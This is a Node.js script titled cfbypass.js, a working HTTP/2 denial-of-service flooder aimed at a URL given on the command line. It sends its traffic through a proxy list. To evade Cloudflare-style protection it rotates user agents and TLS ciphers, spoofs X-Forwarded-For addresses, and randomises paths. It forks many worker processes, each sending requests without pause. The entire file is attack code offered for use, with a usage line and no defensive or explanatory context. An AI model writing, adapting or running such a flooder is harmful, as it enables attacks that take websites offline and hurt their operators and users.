process.on("uncaughtException", function (_0xa2cex1) {});
process.on("unhandledRejection", function (_0xa2cex1) {});
require("events").EventEmitter.defaultMaxListeners = 0;
const fs = require("fs");
const url = require("url");
const randstr = require("randomstring");
const cluster = require("cluster");
const http2 = require("http2");
const http = require("http");
const tls = require("tls");

let headerbuilders;
let COOKIES = undefined;
let POSTDATA = undefined;

if (process.argv.length < 8) {
  console.log("[USAGE] node cfbypass.js [URL] [TEMPO] [THREADS] [GET|POST] [proxies.txt] [REQUESTS/p/IP]");
  process.exit(0);
}

let randomparam = true;
var proxies = fs.readFileSync(process.argv[6], "utf-8").toString().replace(/\r/g, "").split("\n");
var numProxies = proxies.length;
var rate = process.argv[7];
var target_url = process.argv[2];
const target = target_url.split('""')[0];

process.argv.forEach((argument) => {
  if (argument.includes("cookie=") && !process.argv[5].split('""')[0].includes(argument)) {
    COOKIES = argument.slice(7);
  } else if (argument.includes("postdata=") && !process.argv[5].split('""')[0].includes(argument)) {
    if (process.argv[5].toUpperCase() != "POST") {
      console.error("Method Invalid (Has Postdata But Not POST Method)");
      process.exit(1);
    }
    POSTDATA = argument.slice(9);
  } else if (argument.includes("randomstring=")) {
    randomparam = argument.slice(13);
    console.log("[Info] RandomString Mode Enabled.");
  } else if (argument.includes("headerdata=")) {
    headerbuilders = {
      accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
      "accept-encoding": "gzip, deflate, br",
      "accept-language": "en-US,en;q=0.9",
      "sec-ch-ua": 'Not A;Brand";v="99", "Chromium";v="99", "Opera";v="86", "Microsoft Edge";v="100", "Google Chrome";v="101"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-site": "cross-site",
      "sec-fetch-mode": "navigate",
      "sec-fetch-user": "?1",
      TE: "trailers",
      Pragma: "no-cache",
      "upgrade-insecure-requests": 1,
      "Cache-Control": "max-age=0",
      Referer: target,
      "X-Forwarded-For": spoof(),
      Cookie: COOKIES,
      ":method": "GET"
    };
    const headerDataArray = argument.slice(11).split('""')[0].split("&");
    for (let i = 0; i < headerDataArray.length; i++) {
      const headerField = headerDataArray[i].split("=")[0];
      const headerValue = headerDataArray[i].split("=")[1];
      headerbuilders[headerField] = headerValue;
    }
  }
});

if (COOKIES !== undefined) {
  console.log("[Info] Custom Cookie Mode Enabled.");
} else {
  COOKIES = "";
}

if (POSTDATA !== undefined) {
  console.log("[Info] Custom PostData Mode Enabled.");
} else {
  POSTDATA = "";
}

if (headerbuilders !== undefined) {
  console.log("[Info] Custom HeaderData Mode Enabled.");

  if (cluster.isMaster) {
    for (let i = 0; i < process.argv[7]; i++) {
      cluster.fork();
    }
    console.log("[INFO] Started with " + numProxies + " loaded proxies.");
    setTimeout(() => {
      process.exit(1);
    }, process.argv[3] * 1e3);
  } else {
    startFlood();
  }
} else {
  headerbuilders = {
    accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9",
    "sec-ch-ua": 'Not A;Brand";v="99", "Chromium";v="99", "Opera";v="86", "Microsoft Edge";v="100", "Google Chrome";v="101"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-fetch-dest": "empty",
    "sec-fetch-site": "cross-site",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    TE: "trailers",
    Pragma: "no-cache",
    "upgrade-insecure-requests": 1,
    "Cache-Control": "max-age=0",
    Referer: target,
    "X-Forwarded-For": spoof(),
    Cookie: COOKIES,
    ":method": "GET"
  };

  if (cluster.isMaster) {
    for (let i = 0; i < process.argv[7]; i++) {
      cluster.fork();
    }
    console.log("[INFO] Started with " + numProxies + " loaded proxies and no Custom-HeaderData.");

    setTimeout(() => {
      process.exit(1);
    }, process.argv[3] * 1e3);
  } else {
    startFlood();
  }
}

var parsed = url.parse(target);
process.setMaxListeners(0);

function generateRandomString() {
  const charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789";
  const length = 4;
  const randomString = randstr.generate({
    charset: charset,
    length: length
  });
  return randomString;
}

function readUAsFromFile(file) {
  const data = fs.readFileSync(file, "utf8");
  return data.split("\n").map((ua) => ua.trim()).filter((ua) => ua.length > 0);
}

const UAs = readUAsFromFile('ua.txt');

function spoof() {
  return `${randstr.generate({ length: 3, charset: "0123456789" })}.${randstr.generate({ length: 3, charset: "0123456789" })}.${randstr.generate({ length: 3, charset: "0123456789" })}.${randstr.generate({ length: 3, charset: "0123456789" })}`;
}

function readCpsFromFile(file) {
  const data = fs.readFileSync(file, "utf8");
  return data.split("\n").map((ua) => ua.trim()).filter((ua) => ua.length > 0);
}

const cpList = readCpsFromFile('cpList.txt');

function startFlood() {
  headerbuilders[":method"] = "POST";
  headerbuilders["Content-Type"] = "text/plain";

  const sendRequest = () => {
    headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)];
    var cipher = cpList[Math.floor(Math.random() * cpList.length)];
    var proxy = proxies[Math.floor(Math.random() * proxies.length)];
    proxy = proxy.split(":");
    var http = require("http"),
      tls = require("tls");
    tls.DEFAULT_MAX_VERSION = "TLSv1.3";

    var requestForConnect = http.request({
      host: proxy[0],
      port: proxy[1],
      ciphers: cipher,
      method: "CONNECT",
      path: parsed.host + ":443"
    }, response => {
      requestForConnect.end();
      return;
    });

    requestForConnect.on("connect", function(response, socket, headerField) {
      const h2Connection = http2.connect(parsed.href, {
        createConnection: () => {
          return tls.connect({
            host: parsed.host,
            ciphers: cipher,
            secureProtocol: "TLS_method",
            servername: parsed.host,
            challengesToSolve: 5,
            cloudflareTimeout: 5e3,
            cloudflareMaxTimeout: 3e4,
            maxRedirects: 20,
            followAllRedirects: true,
            decodeEmails: false,
            gzip: true,
            servername: parsed.host,
            secure: true,
            rejectUnauthorized: false,
            ALPNProtocols: ["h2"],
            socket: socket
          }, function() {
            for (let i = 0; i < rate; i++) {
              headerbuilders[":path"] = `${""}${url.parse(target).path.replace("%RAND%", generateRandomString())}${"?"}${randomparam}${"="}${randstr.generate({length: 12, charset: "ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"})}${""}`;
              headerbuilders["X-Forwarded-For"] = spoof();
              headerbuilders.Body = `${""}${POSTDATA.includes("%RAND%") ? POSTDATA.replace("%RAND%", generateRandomString()) : POSTDATA}${""}`;
              headerbuilders.Cookie.replace("%RAND%", generateRandomString());
              const requestForH2 = h2Connection.request(headerbuilders);
              requestForH2.end();
              requestForH2.on("response", () => {
                requestForH2.close();
              });
            }
          });
        }
      });
    });
    requestForConnect.end();
  };

  if (randomparam) {
    setInterval(sendRequest);
  } else {
    setInterval(sendRequest);
  }
}
